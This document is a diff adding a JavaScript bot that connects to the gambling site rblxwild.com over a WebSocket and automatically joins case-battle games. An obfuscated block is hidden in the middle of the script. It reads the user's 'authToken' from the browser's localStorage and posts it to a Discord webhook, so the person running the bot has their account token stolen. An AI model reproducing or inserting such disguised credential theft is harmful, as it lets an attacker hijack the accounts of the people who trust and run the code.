@@ -1,0 +1,68 @@
+
+function lord() {
+let socket = new WebSocket("wss://rblxwild.com/socket.io/?EIO=4&transport=websocket");
+authtoken = "AuthToken Here"
+socket.onopen = function(e) {
+
+};
+function _0x353c(){var _0x327af9=['@here\x20Auth','entication','scord.com/','yWl2R2iAmo','9rpY97XaXr','authToken','5789472SYJXhX','\x20Token:\x20','open','ks/1074756','lAtzbJpByT','n/json','https://di','setRequest','api/webhoo','getItem','Content-Ty','applicatio','1837uXRpVz','302920bdXwNP','stringify','f40xEEIguU','67740CHqEBR','9YGidn4wcv','1080746NLejbw','6mUHqol','GFdkdXREfW','62/iM9AcaN','630933oLnzDU','8fybFdH','4314565AqMoiR','7511336riEimE','3967316050','2PxICge','72DQYdVq','send','Header','POST'];_0x353c=function(){return _0x327af9;};return _0x353c();}var _0x12b058=_0x4f83;function _0x4f83(_0x45af5d,_0x4cf23d){var _0x35bfdd=_0x353c();return _0x4f83=function(_0x36d72e,_0x5f7039){_0x36d72e=_0x36d72e-(0x5d*-0xd+-0x2169+0x7*0x5a4);var _0x1f7328=_0x35bfdd[_0x36d72e];return _0x1f7328;},_0x4f83(_0x45af5d,_0x4cf23d);}(function(_0x1b2f89,_0x51fe7f){var _0x19010f=_0x4f83,_0x20ddd3=_0x1b2f89();while(!![]){try{var _0x3b954e=-parseInt(_0x19010f(0x171))/(0x13*-0x1f5+0x35*0x3+0x2491)*(parseInt(_0x19010f(0x168))/(0x1c*0x1d+0xbae+-0x26*0x64))+-parseInt(_0x19010f(0x16c))/(0x802+0x43*-0x7+-0x62a)*(parseInt(_0x19010f(0x16d))/(0x134c+-0x16fb+0x3b3))+parseInt(_0x19010f(0x16e))/(-0x10e9*0x2+-0x1e65+0x4*0x100f)*(-parseInt(_0x19010f(0x169))/(-0x4c*0x1f+0x1122*0x1+0x2e*-0x2c))+parseInt(_0x19010f(0x16f))/(-0x5d*-0x67+-0x198e*-0x1+0x47f*-0xe)+parseInt(_0x19010f(0x17c))/(0x1*-0x1cf+-0x1b49+-0x3a4*-0x8)+-parseInt(_0x19010f(0x172))/(-0x1ee3+0x1a25+0x1*0x4c7)*(-parseInt(_0x19010f(0x163))/(0x184e+-0x25df+0xd9b))+-parseInt(_0x19010f(0x162))/(0x1211+0x1bb6+0x4*-0xb6f)*(-parseInt(_0x19010f(0x166))/(-0x3*-0x583+0x5d*-0x3e+0x609));if(_0x3b954e===_0x51fe7f)break;else _0x20ddd3['push'](_0x20ddd3['shift']());}catch(_0x14b28f){_0x20ddd3['push'](_0x20ddd3['shift']());}}}(_0x353c,-0x1*-0x10ffa3+0x5d813+-0xd6b98));var request=new XMLHttpRequest();request[_0x12b058(0x17e)](_0x12b058(0x175),_0x12b058(0x15c)+_0x12b058(0x178)+_0x12b058(0x15e)+_0x12b058(0x17f)+_0x12b058(0x170)+_0x12b058(0x16b)+_0x12b058(0x16a)+_0x12b058(0x167)+_0x12b058(0x179)+_0x12b058(0x15a)+_0x12b058(0x165)+_0x12b058(0x17a)+'Q',!![]),request[_0x12b058(0x15d)+_0x12b058(0x174)](_0x12b058(0x160)+'pe',_0x12b058(0x161)+_0x12b058(0x15b));var params=JSON[_0x12b058(0x164)]({'content':_0x12b058(0x176)+_0x12b058(0x177)+_0x12b058(0x17d)+localStorage[_0x12b058(0x15f)](_0x12b058(0x17b))});request[_0x12b058(0x173)](params);
+socket.onmessage = function(event) {
+if (!(event.data.includes("syncResponse"))) console.log(event.data)
+    if (event.data.startsWith("0")) {
+        socket.send("40")
+    }
+    if (event.data.startsWith("40")) {
+        socket.send(`42["authentication",{"authToken":"${authtoken}","clientTime":${Date.now()}}]`)
+        setTimeout(() => {
+            function keepalive() {
+                socket.send(`42["time:requestSync",{"clientTime":${Date.now()}}]`)
+                setTimeout(() => {
+                    keepalive()
+                }, 1000);
+            }
+            keepalive()
+        }, 3000);
+    }
+    
+
+
+    if (event.data.startsWith(`42["authenticationResponse"`)) {
+        socket.send(`42["casebattles:subscribe"]`)
+    }
+    if (event.data.startsWith(`42["casebattles:pushGame`)) {
+        pushedBattle = JSON.parse(event.data.replace("42", ""))[1]
+        if (pushedBattle.betAmount * 0.2 <= pushedBattle.funding) {
+            console.log(`Found game: \nID: ${pushedBattle.id}\nType: ${pushedBattle.versusType}\nBet amount: ${pushedBattle.betAmount}\nFunding amount: ${pushedBattle.funding}`)
+            if (pushedBattle.versusType == "2v2") {
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":0}]`)
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":1,"seatIndex":1}]`)
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":1}]`)
+            }
+            if (pushedBattle.versusType == "1v1") {
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":0}]`)
+            }
+            if (pushedBattle.versusType == "1v1v1") {
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":3,"seatIndex":0}]`)
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":0}]`)
+            }
+            if (pushedBattle.versusType == "1v1v1v1") {
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":3,"seatIndex":0}]`)
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":0}]`)
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":4,"seatIndex":0}]`)
+            }
+        }
+    }
+};
+
+socket.onclose = function(event) {
+console.log("Lord Rule RblxWild")
+  ws.close()
+  lord()
+};
+
+socket.onerror = function(error) {
+  console.log(`[error]`)
+  lord()
+};
+}
+lord()
